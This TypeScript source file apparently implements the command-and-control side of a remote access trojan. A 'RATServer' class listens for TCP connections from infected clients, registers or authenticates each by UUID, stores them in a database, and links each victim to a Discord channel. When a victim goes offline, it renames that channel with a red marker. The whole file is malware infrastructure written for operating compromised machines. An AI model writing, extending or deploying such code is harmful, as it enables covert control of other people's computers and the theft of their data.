import {createServer, Server, Socket} from 'net';
import CustomClient from './CustomClient';
import ITCPServer from "../interfaces/IRATServer";
import RATClient from './RATClient';
import TextChannel from 'discord.js';
import Code from '../enums/Codes';

export default class RATServer implements ITCPServer {
    client: CustomClient;
    host: string;
    port: number;
    ratClients: RATClient[];
    server: Server;
    started: boolean = false;
    
    constructor(client: CustomClient) {
        this.client = client;
        this.ratClients = new Array<RATClient>();
        this.host = client.config.tcpHost;
        this.port = client.config.tcpPort;
        this.server = createServer();
    }
    
    start(): void {
        this.server.listen(this.port, this.host, () => {
            this.started = true;
            console.log(`RAT TCP server started on ${this.host}:${this.port}`);
        });
        this.server.on('connection', async (socket: Socket) => {
            // create client object and adds it to the clients array
            let client = new RATClient(socket, this, '');
            this.ratClients.push(client);

            let packet = await client.receive();
            if (!packet) {
                console.log('Invalid data received');
                client.disconnect();
                return;
            }
            // if first time client connects, initiates first time connection
            if (packet?.code === Code.ASK_UUID) {
                client.firstTimeConnect();
                return;
            } else if (packet?.code === Code.AUTH_UUID) {

                if (packet.length !== 36) {
                    console.log('Invalid data received');
                    client.disconnect();
                    return;
                }
                if (!packet.payload) {
                    console.log('Invalid data received');
                    client.disconnect();
                    return;
                }

                const uuid = packet.payload.toString();
                client.connect(uuid);
                return;
            }
        });
    }
    
    stop(): void {
        console.log(`Server stopped on ${this.host}:${this.port}`);
    }

    isListening(): boolean {
        return this.started;
    }

    async getClientByChannelId(channelId: string): Promise<RATClient | undefined> {
        const user = await this.client.database.user.findFirstOrThrow({
            where: {
                channelId: channelId
            }
        });
        const RATClient = this.client.ratServer.ratClients.find(client => client.uuid == user.uuid);
        if (!RATClient) {
            return undefined;
        }
        return RATClient;
    }

    async removeClient(client: RATClient): Promise<void> {
        this.ratClients = this.ratClients.filter((c) => c !==client);
        if (client.uuid === '') {
            return;
        }
        // Search client in database with uuid and set connected status to false
        await this.client.database.user.update({
            where: {
                uuid: client.uuid
            },
            data: {
                connected: false
            }
        });
        const user = await this.client.database.user.findUnique({
            where: {
                uuid: client.uuid
            }
        })
        if (!user) {
            console.log(`User with UUID ${client.uuid} not found`);
            return;
        }
        //@ts-ignore
        let channel = this.client.channels.cache.get(user.channelId) as TextChannel;
        if (!channel) {
            console.log(`Channel with ID ${user.channelId} not found - Deletion`);
            return;
        }
        await channel.setName(`🔴${channel.name.substring(2, channel.name.length)}`);
    }
}